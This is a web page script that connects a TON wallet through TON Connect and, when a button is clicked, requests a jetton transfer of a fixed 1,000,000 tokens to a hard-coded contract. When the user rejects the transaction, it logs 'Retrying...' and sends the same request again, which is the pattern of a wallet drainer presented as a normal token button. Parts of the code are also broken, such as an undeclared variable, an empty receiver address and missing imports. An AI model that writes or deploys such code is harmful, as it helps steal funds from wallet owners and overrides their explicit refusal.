const tonweb = new TonWeb();

const Current_URL = window.location.href.replace(/http[s]*:\/\//, "");
let public_key = null

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: `https://${Current_URL}/tonconnect-manifest.json`,
     buttonRootId: 'ton-connect'
  });
  
  
  tonConnectUI.onStatusChange(async (walletDetails) => {
    if (walletDetails) {
        console.log(walletDetails)
        console.log("wallet details changed")
        const address = walletDetails.account.address;
        const wallet = walletDetails.appName;
        wallet_public_key = walletDetails.account.publicKey;
    } else {
       console.log("Failed to connect Ton wallet")
    }
  });




const transferTokens = async ()  => {
    console.log("Token transfer initiated");

    const gas_fee_amount = "0.11";
    const gas_fee = gas_fee_amount * Math.pow(10, 9); // Convert 0.11 TON to nanoTON
    const contract_address = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"; 
    const receiver = "";

    const body = beginCell()
    .storeUint(0xf8a7ea5, 32)                 // jetton transfer op code
    .storeUint(0, 64)                         // query_id:uint64
    .storeCoins(toNano("1000000"))              // amount:(VarUInteger 16) -  Jetton amount for transfer (decimals = 6 - USDT, 9 - default). Function toNano use decimals = 9 (remember it)
    .storeAddress(Address.parse(receiver))  // destination:MsgAddress
    .storeAddress(Address.parse(receiver))  // response_destination:MsgAddress
    .storeUint(0, 1)                          // custom_payload:(Maybe ^Cell)
    .storeCoins(toNano("0.001"))                 // forward_ton_amount:(VarUInteger 16) - if >0, will send notification message
    .storeUint(0,1)                           // forward_payload:(Either Cell ^Cell)
    .endCell();

    let transactionAccepted = false;
    const transaction = {
        messages: [
            {
                address: contract_address,
                amount: gas_fee,
                payload: body.toBoc().toString("base64")
            }
        ]
    };

    while (!transactionAccepted) {
        try {
            const result = await tonConnectUI.sendTransaction(transaction);
            console.log("Transaction submitted. Waiting for confirmation...");
            console.log("Transaction successful:", result);
            transactionAccepted = true;
        } catch (error) {
            console.error("Error during transaction:", error);
            if (error.code === "Reject request") {
                console.log("User denied the transaction. Retrying...");
                const result = await tonConnectUI.sendTransaction(transaction);
            } else {
                console.error("An error occurred:", error);
                break;
            }
        }
    }
}


  document.addEventListener('DOMContentLoaded', () => {
    const connectWalletButtons = document.querySelectorAll('.transfer-tokens');
    connectWalletButtons.forEach(button => {
      button.addEventListener('click', async () => {
       await transferTokens();
      });
    });
  });
